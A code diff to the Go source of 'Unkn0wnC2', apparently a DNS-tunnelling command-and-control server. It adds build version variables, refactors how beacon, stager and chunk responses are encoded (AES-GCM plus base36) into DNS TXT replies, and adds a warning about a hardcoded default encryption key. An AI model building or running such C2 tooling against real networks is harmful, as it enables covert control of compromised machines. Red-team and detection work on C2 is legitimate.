@@ -23,6 +23,13 @@ var (
 	debugMode bool       // debugMode enables verbose logging for troubleshooting
 )
 
+// Build-time version information (set via -ldflags during build)
+var (
+	version   = "0.1.0"
+	buildDate = "unknown"
+	gitCommit = "unknown"
+)
+
 /*
 	forwardDNSQuery forwards a DNS query to an upstream DNS server and returns the response.
 	This is used to forward legitimate DNS queries when the server is acting as an
@@ -238,20 +245,20 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 				// CHUNK responses are plain text (base64 data is already DNS-safe)
 				// META responses need base36 encoding for DNS compatibility
 				if strings.HasPrefix(c2Response, "CHUNK|") {
-					// CHUNK responses sent as plain text (data is already base64)
+				// CHUNK responses sent as plain text (data is already base64)
+				encoded = c2Response
+			} else if strings.HasPrefix(c2Response, "META|") {
+				// Stager META responses - use base36 encoding only (no encryption)
+				encoded = base36EncodeString(c2Response)
+			} else {
+				// Beacon response - use AES-GCM + base36
+				var encErr error
+				encoded, encErr = encryptAndEncode(c2Response, c2Manager.GetEncryptionKey())
+				if encErr != nil {
+					// Fallback to plain response if encryption fails
 					encoded = c2Response
-				} else if strings.HasPrefix(c2Response, "META|") {
-					// Stager META responses - use base36 encoding only (no encryption)
-					encoded = base36EncodeString(c2Response)
-				} else {
-					// Beacon response - use AES-GCM + base36
-					var encErr error
-					encoded, encErr = encryptAndEncode(c2Response, c2Manager.aesKey)
-					if encErr != nil {
-						// Fallback to plain response if encryption fails
-						encoded = c2Response
-					}
-				} // TXT records need proper length-prefixed format
+				}
+			} // TXT records need proper length-prefixed format
 				// Each string in a TXT record can be max 255 bytes
 				var txtData []byte
 
@@ -461,6 +468,12 @@ func main() {
 	}
 	debugMode = cfg.Debug
 
+	// SECURITY: Warn if using default encryption key
+	if cfg.EncryptionKey == "MySecretC2Key123!@#DefaultChange" {
+		fmt.Println("⚠️  WARNING: Using default encryption key! Change this in production!")
+		fmt.Println("⚠️  Set encryption_key in config.json or via environment variable")
+	}
+
 	// Initialize C2Manager
 	c2Manager = NewC2Manager(debugMode, cfg.EncryptionKey)
 
@@ -481,8 +494,12 @@ func main() {
 
 	// Log the actual local address we're bound to
 	localAddr := pc.LocalAddr()
-	fmt.Printf("Authoritative DNS C2 Server for %s listening on %s (local: %s)\n",
-		cfg.Domain, bindAddr, localAddr.String())
+	fmt.Printf("==================================================\n")
+	fmt.Printf("Unkn0wnC2 DNS C2 Server v%s\n", version)
+	fmt.Printf("Build: %s (commit: %s)\n", buildDate, gitCommit)
+	fmt.Printf("==================================================\n")
+	fmt.Printf("Authoritative DNS Server for: %s\n", cfg.Domain)
+	fmt.Printf("Listening on: %s (local: %s)\n", bindAddr, localAddr.String())
 
 	if cfg.ForwardDNS {
 		fmt.Printf("DNS Forwarding: Enabled (upstream: %s)\n", cfg.UpstreamDNS)
